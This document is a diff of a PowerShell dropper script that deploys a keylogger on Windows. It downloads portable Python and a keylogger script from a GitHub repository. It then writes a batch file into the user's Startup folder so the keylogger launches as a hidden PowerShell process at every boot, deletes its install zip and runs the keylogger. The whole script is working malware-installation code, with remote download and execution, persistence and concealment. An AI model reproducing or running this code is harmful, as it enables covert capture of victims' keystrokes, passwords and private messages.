@@ -1,10 +1,9 @@
-
 #MAIN SCRIPT
 
 #Getting the embedded zip folder with python from official website and string it on computer
 
 $source = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-embed-amd64.zip';
-$user = [System.Environment]::UserName;
+
 $destination = "C:\Temp\Python3.zip";
 
 Invoke-WebRequest -Uri $source -OutFile $destination;
@@ -37,14 +36,16 @@ timeout 25
 
 cd C:\Temp\Python3
 
+
 #Removing the old python311._pth file
 
 Remove-Item python311._pth
 
+
 #Downloading the new edited python311._pth file, that allows PIP to run, without installing python on computer
 
 $sourceUrl = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/python311._pth';
-$user = [System.Environment]::UserName;
+
 $destination4replacement = "C:\Temp\Python3\python311._pth";
 
 Invoke-WebRequest -Uri $sourceUrl -OutFile $destination4replacement;
@@ -63,7 +64,7 @@ timeout 15
 # Downloading the keylogger python script
 
 $sourceKeyLogger = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/keyloggerscript.py';
-$user = [System.Environment]::UserName;
+
 $destination4keylogger = "C:\Temp\keyloggerscript.py";
 
 Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
@@ -72,12 +73,20 @@ Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
 
 # Creating trigger file on startup for keylogger, so that everytime the computer starts, the keyloggerscript.py is triggerd to run as a hidden process
 
+$user = [System.Environment]::UserName;
 
 New-Item "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat";
 
 Set-Content "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" "start powershell ""start powershell -WindowStyle Hidden 'C:\Temp\Python3\python.exe C:\Temp\keyloggerscript.py'"";"
 
 
-# Running keylogger scripTemp\Python3\python.exe C:\Temp\keyloggerscript.py
+# Removing the Python3.zip folder, we dont need it anymore
+
+cd C:\Temp
+
+Remove-Item Python3.zip
+
+
+# Running keylogger script
 
 powershell -c C:\Temp\Python3\python.exe C:\Temp\keyloggerscript.py
